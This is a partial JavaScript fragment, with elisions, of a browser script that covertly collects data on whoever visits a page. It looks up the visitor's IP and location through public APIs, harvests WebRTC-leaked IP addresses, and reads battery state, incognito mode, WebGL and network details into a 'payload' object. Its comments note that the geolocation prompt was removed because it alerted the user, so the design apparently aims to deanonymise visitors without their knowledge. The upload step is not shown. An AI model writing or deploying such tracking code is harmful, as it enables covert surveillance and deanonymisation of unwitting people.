...
// ── IP + geo (HTTPS-compatible APIs, no CORS issues) ──────────
async function fetchIPData() {
  // ipwho.is — free, HTTPS, full CORS support
  try {
    const r = await fetch("https://ipwho.is/");
    const d = await r.json();
    if (d && d.success !== false && d.ip) return d;
  } catch(e) {}
  ...
  try {
    ...
    const d = await r.json();
    if (d && d.ipAddress) return { _src: "freeipapi", ...d };
  } catch(e) {}

  return {};
}

// ── Normalise varied API shapes into one object ───────────────
function normaliseIP(d) {
  if (!d) return {};
  // ipwho.is shape
  ...
  if (d._src === "freeipapi") return {
    ...
    district:     "",
    reverse:      "",
    mobile:       d.isProxy === false,
    proxy:        d.isProxy,
    hosting:      false
  };
  return d; // already normalised or unknown shape
}
...
async function collect() {
  ...
  try {
    // Fire all parallel tasks — NO geolocation prompt
    const [ipRaw, webrtcIPs, battery, incognito] = await Promise.all([
      fetchIPData(),
      getWebRTCIPs(),
      batteryInfo(),
      detectIncognito()
    ...
    const ipData = normaliseIP(ipRaw);
    const wgl = webglInfo();
    ...
    const payload = {
      ...
      webrtc:   webrtcIPs,
      battery:  battery,
      gpsgeo:   null,       // removed — was prompting user
      incognito: incognito,
      webgl:    wgl,
      network:  net,
      nav: {
